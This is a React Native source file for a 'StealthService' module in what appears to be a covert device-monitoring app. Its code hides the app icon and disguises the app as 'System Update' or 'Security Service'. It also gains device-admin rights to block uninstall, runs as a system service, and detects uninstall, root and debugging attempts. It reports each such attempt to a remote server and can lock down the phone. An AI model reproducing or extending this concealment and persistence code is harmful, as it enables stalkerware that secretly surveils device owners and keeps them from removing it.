/**
 * StealthService - Security and stealth features
 * Handles app concealment, tamper protection, and security
 */

import { Platform, Alert, Linking, NativeModules } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import ApiService from './ApiService';

const { StealthModule } = NativeModules;

class StealthService {
  constructor() {
    this.isStealthMode = false;
    this.isProtected = false;
    this.adminPasswordHash = null;
    this.tamperDetectionActive = false;
    this.securityCheckInterval = null;
    
    // Security settings
    this.securityConfig = {
      hideAppIcon: false,
      preventUninstall: false,
      requirePasswordForChanges: false,
      detectTamperAttempts: false,
      disguiseAppName: false,
      runAsSystemService: false
    };
  }

  async initialize() {
    console.log('Initializing stealth service...');
    
    try {
      // Load stealth configuration
      await this.loadStealthConfig();
      
      // Setup security measures
      await this.setupSecurity();
      
      // Start tamper detection
      if (this.securityConfig.detectTamperAttempts) {
        await this.startTamperDetection();
      }
      
      console.log('Stealth service initialized successfully');
      return true;
    } catch (error) {
      console.error('Stealth service initialization error:', error);
      return false;
    }
  }

  async loadStealthConfig() {
    try {
      const configData = await AsyncStorage.getItem('stealth_config');
      if (configData) {
        this.securityConfig = { ...this.securityConfig, ...JSON.parse(configData) };
      }
      
      const stealthMode = await AsyncStorage.getItem('stealth_mode');
      this.isStealthMode = stealthMode === 'true';
      
      const passwordHash = await AsyncStorage.getItem('admin_password_hash');
      this.adminPasswordHash = passwordHash;
      
      console.log('Loaded stealth configuration:', this.securityConfig);
    } catch (error) {
      console.error('Load stealth config error:', error);
    }
  }

  async setupSecurity() {
    try {
      console.log('Setting up security measures...');
      
      // Hide app icon if configured
      if (this.securityConfig.hideAppIcon) {
        await this.hideAppIcon();
      }
      
      // Prevent uninstall if configured
      if (this.securityConfig.preventUninstall) {
        await this.enableUninstallProtection();
      }
      
      // Disguise app if configured
      if (this.securityConfig.disguiseAppName) {
        await this.disguiseApp();
      }
      
      // Run as system service if configured
      if (this.securityConfig.runAsSystemService) {
        await this.runAsSystemService();
      }
      
      this.isProtected = true;
      console.log('Security measures activated');
    } catch (error) {
      console.error('Security setup error:', error);
    }
  }

  async hideAppIcon() {
    try {
      console.log('Attempting to hide app icon...');
      
      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.hideAppIcon();
        await ApiService.sendAlert('stealth_activated', {
          action: 'hide_icon',
          timestamp: new Date().toISOString()
        });
      } else {
        console.log('App icon hiding not available or native module not found');
      }
      
    } catch (error) {
      console.error('Hide app icon error:', error);
    }
  }

  async showAppIcon() {
    try {
      console.log('Attempting to show app icon...');
      
      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.showAppIcon();
        await ApiService.sendAlert('stealth_deactivated', {
          action: 'show_icon',
          timestamp: new Date().toISOString()
        });
      } else {
        console.log('App icon showing not available or native module not found');
      }
      
    } catch (error) {
      console.error('Show app icon error:', error);
    }
  }

  async enableStealthMode() {
    try {
      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.hideAppIcon();
        await AsyncStorage.setItem('stealth_mode', 'true');
        this.isStealthMode = true;
        return true;
      }
      return false;
    } catch (error) {
      console.error('Enable stealth mode error:', error);
      return false;
    }
  }

  async disableStealthMode() {
    try {
      if (this.securityConfig.requirePasswordForChanges) {
        const passwordVerified = await this.promptAdminPassword();
        if (!passwordVerified) {
          return false;
        }
      }

      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.showAppIcon();
        await AsyncStorage.setItem('stealth_mode', 'false');
        this.isStealthMode = false;
        return true;
      }
      return false;
    } catch (error) {
      console.error('Disable stealth mode error:', error);
      return false;
    }
  }

  async enableUninstallProtection() {
    try {
      console.log('Enabling uninstall protection...');
      
      if (Platform.OS === 'android' && StealthModule) {
        const isAdmin = await StealthModule.isDeviceAdmin();
        if (!isAdmin) {
          await StealthModule.requestDeviceAdmin();
        }
        await ApiService.sendAlert('protection_enabled', {
          type: 'uninstall_protection',
          timestamp: new Date().toISOString()
        });
      } else {
        console.log('Uninstall protection requires MDM on iOS or native module not found');
      }
      
    } catch (error) {
      console.error('Uninstall protection error:', error);
    }
  }

  async disguiseApp() {
    try {
      console.log('Disguising app appearance...');
      
      const disguises = [
        { name: 'System Update', icon: 'system_update' },
        { name: 'Security Service', icon: 'security' },
        { name: 'Network Monitor', icon: 'wifi' },
        { name: 'Device Manager', icon: 'settings' },
        { name: 'Battery Optimizer', icon: 'battery' }
      ];
      
      const selectedDisguise = disguises[Math.floor(Math.random() * disguises.length)];
      
      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.disguiseApp(selectedDisguise.name, selectedDisguise.icon);
        await AsyncStorage.setItem('app_disguised', 'true');
        await AsyncStorage.setItem('disguise_name', selectedDisguise.name);
      } else {
        console.log('App disguise not available or native module not found');
      }
      
    } catch (error) {
      console.error('App disguise error:', error);
    }
  }

  async runAsSystemService() {
    try {
      console.log('Attempting to run as system service...');
      
      if (Platform.OS === 'android' && StealthModule) {
        await StealthModule.runAsSystemService();
        await AsyncStorage.setItem('system_service_active', 'true');
      } else {
        console.log('Running as system service not available or native module not found');
      }
      
    } catch (error) {
      console.error('System service error:', error);
    }
  }

  async startTamperDetection() {
    try {
      console.log('Starting tamper detection...');
      
      this.tamperDetectionActive = true;
      
      this.securityCheckInterval = setInterval(() => {
        this.performSecurityChecks();
      }, 30 * 1000);
      
      await this.monitorRootDetection();
      
      console.log('Tamper detection activated');
    } catch (error) {
      console.error('Tamper detection setup error:', error);
    }
  }

  async performSecurityChecks() {
    try {
      if (!this.tamperDetectionActive) return;
      
      await this.checkAppIntegrity();
      await this.checkDebuggingAttempts();
      await this.checkUninstallAttempts();
      
    } catch (error) {
      console.error('Security checks error:', error);
    }
  }

  async checkAppIntegrity() {
    try {
      if (Platform.OS === 'android' && StealthModule) {
        const isValid = await StealthModule.checkAppIntegrity();
        if (!isValid) {
          await this.handleTamperAttempt('app_modified', {});
        }
      }
    } catch (error) {
      console.error('App integrity check error:', error);
    }
  }

  async checkDebuggingAttempts() {
    try {
      const isDebugging = await DeviceInfo.isEmulator();
      
      if (isDebugging) {
        await this.handleTamperAttempt('debugging_detected', {
          type: 'emulator_or_debug'
        });
      }
      
    } catch (error) {
      console.error('Debug detection error:', error);
    }
  }

  async checkUninstallAttempts() {
    try {
      if (Platform.OS === 'android' && StealthModule) {
        const uninstallAttempt = await StealthModule.checkUninstallAttempt();
        if (uninstallAttempt) {
          await this.handleTamperAttempt('uninstall_attempt', {
            action: 'settings_accessed'
          });
        }
      }
    } catch (error) {
      console.error('Uninstall attempt check error:', error);
    }
  }

  async monitorRootDetection() {
    try {
      const isRooted = await DeviceInfo.isRooted();
      
      if (isRooted) {
        await this.handleTamperAttempt('root_detected', {
          type: 'device_rooted'
        });
      }
      
    } catch (error) {
      console.error('Root detection error:', error);
    }
  }

  async handleTamperAttempt(type, details) {
    try {
      console.log(`Tamper attempt detected: ${type}`, details);
      
      const tamperEvent = {
        type: type,
        details: details,
        timestamp: new Date().toISOString(),
        severity: this.getTamperSeverity(type),
        deviceInfo: await DeviceInfo.getUniqueId()
      };
      
      await this.logTamperEvent(tamperEvent);
      await ApiService.sendAlert('tamper_attempt', tamperEvent);
      await this.takeDefensiveAction(type, tamperEvent.severity);
      
    } catch (error) {
      console.error('Handle tamper attempt error:', error);
    }
  }

  getTamperSeverity(type) {
    const severityMap = {
      'app_modified': 'high',
      'debugging_detected': 'medium',
      'uninstall_attempt': 'high',
      'root_detected': 'critical'
    };
    
    return severityMap[type] || 'medium';
  }

  async takeDefensiveAction(type, severity) {
    try {
      console.log(`Taking defensive action for ${type} (severity: ${severity})`);
      
      if (Platform.OS !== 'android' || !StealthModule) {
        console.log('Defensive actions require native module');
        return;
      }
      
      switch (severity) {
        case 'critical':
          await StealthModule.emergencyLockdown();
          await ApiService.sendAlert('emergency_lockdown', {
            timestamp: new Date().toISOString(),
            reason: 'Critical tamper attempt detected'
          });
          break;
          
        case 'high':
          await StealthModule.hideAppIcon();
          break;
          
        case 'medium':
          // Future: Increase logging detail
          break;
      }
      
    } catch (error) {
      console.error('Defensive action error:', error);
    }
  }
  
  async logTamperEvent(event) {
    try {
      const key = `tamper_event_${Date.now()}`;
      await AsyncStorage.setItem(key, JSON.stringify(event));
    } catch (error) {
      console.error('Log tamper event error:', error);
    }
  }

  // Password protection methods
  async setAdminPassword(password) {
    try {
      const hash = await this.hashPassword(password);
      this.adminPasswordHash = hash;
      await AsyncStorage.setItem('admin_password_hash', hash);
      
      console.log('Admin password set');
      return true;
    } catch (error) {
      console.error('Set admin password error:', error);
      return false;
    }
  }

  async verifyAdminPassword(password) {
    try {
      if (!this.adminPasswordHash) {
        return false;
      }
      
      const hash = await this.hashPassword(password);
      return hash === this.adminPasswordHash;
    } catch (error) {
      console.error('Verify admin password error:', error);
      return false;
    }
  }

  async hashPassword(password) {
    try {
      // In a real app, use a robust library like bcrypt or scrypt
      let hash = 0;
      for (let i = 0; i < password.length; i++) {
        const char = password.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      return hash.toString();
    } catch (error) {
      console.error('Hash password error:', error);
      return null;
    }
  }

  async promptAdminPassword() {
    return new Promise((resolve) => {
      Alert.prompt(
        'Administrator Access',
        'Enter administrator password to make changes:',
        [
          {
            text: 'Cancel',
            style: 'cancel',
            onPress: () => resolve(false)
          },
          {
            text: 'OK',
            onPress: async (password) => {
              const valid = await this.verifyAdminPassword(password);
              resolve(valid);
            }
          }
        ],
        'secure-text'
      );
    });
  }

  async cleanup() {
    try {
      console.log('Cleaning up stealth service...');
      
      this.tamperDetectionActive = false;
      
      if (this.securityCheckInterval) {
        clearInterval(this.securityCheckInterval);
        this.securityCheckInterval = null;
      }
      
      console.log('Stealth service cleanup completed');
    } catch (error) {
      console.error('Stealth service cleanup error:', error);
    }
  }
}

export { StealthService };
export default new StealthService();
